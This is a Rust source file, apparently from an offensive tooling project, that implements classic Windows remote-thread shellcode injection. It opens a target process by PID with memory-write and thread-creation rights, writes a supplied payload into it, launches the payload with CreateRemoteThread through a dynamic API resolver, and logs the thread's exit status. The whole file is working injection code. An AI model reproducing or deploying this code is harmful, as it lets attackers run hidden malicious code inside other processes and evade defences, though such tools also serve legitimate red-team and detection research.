use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::common::{free_remote, write_remote_payload};
    use crate::resolve;

    const PROCESS_CREATE_THREAD: u32 = 0x0002;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_VM_WRITE: u32 = 0x0020;
    const INFINITE: u32 = 0xFFFFFFFF;
    const WAIT_OBJECT_0: u32 = 0;

    log.step(format!("[1/6] Open target (PID {})", pid));
    let process_access = PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION
        | PROCESS_VM_READ
        | PROCESS_VM_WRITE;
    let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
    if process.is_null() {
        return Err("process open failed (check privileges — try from an elevated shell)".to_string());
    }

    let size = shellcode.len();
    let base = write_remote_payload(process, shellcode, 6, log)?;

    log.step(format!("[5/6] Start remote thread at {:#p}", base));
    let mut thread_id: u32 = 0;
    let thread = unsafe {
        resolve::CreateRemoteThread(
            process,
            std::ptr::null(),
            0,
            base as *const std::ffi::c_void,
            base as *const std::ffi::c_void,
            0,
            &mut thread_id,
        )
    };
    if thread.is_null() {
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(process) };
        return Err("remote thread creation failed".to_string());
    }
    log.info(format!("      remote thread started (TID {})", thread_id));

    log.step("[6/6] Waiting for completion");
    let wait = unsafe { resolve::WaitForSingleObject(thread, INFINITE) };
    if wait != WAIT_OBJECT_0 {
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(thread) };
        unsafe { resolve::CloseHandle(process) };
        return Err(format!(
            "wait returned {} (expected 0)",
            wait
        ));
    }
    let mut exit_code: u32 = 0;
    if unsafe { resolve::GetExitCodeThread(thread, &mut exit_code) } == 0 {
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(thread) };
        unsafe { resolve::CloseHandle(process) };
        return Err("exit code retrieval failed".to_string());
    }
    unsafe { resolve::CloseHandle(thread) };
    unsafe { resolve::CloseHandle(process) };

    if exit_code == 259 {
        return Err("remote thread is still active after an INFINITE wait".to_string());
    }
    if exit_code == 0xC0000005 {
        log.error(format!(
            "      remote thread CRASHED — exit code 0x{:X} (ACCESS_VIOLATION)",
            exit_code
        ));
        log.error("      invalid memory access");
        log.error(
            "      pipeline OK (NOP works) — payload is broken",
        );
    } else if exit_code >= 0xC0000000 {
        log.warning(format!(
            "      remote thread exited with NTSTATUS error 0x{:X}",
            exit_code
        ));
    } else {
        log.info(format!(
            "      remote thread exited with code {}",
            exit_code
        ));
    }
    log.info(format!(
        "      payload at {:#p} ({} bytes)",
        base, size
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("requires Windows".to_string())
}
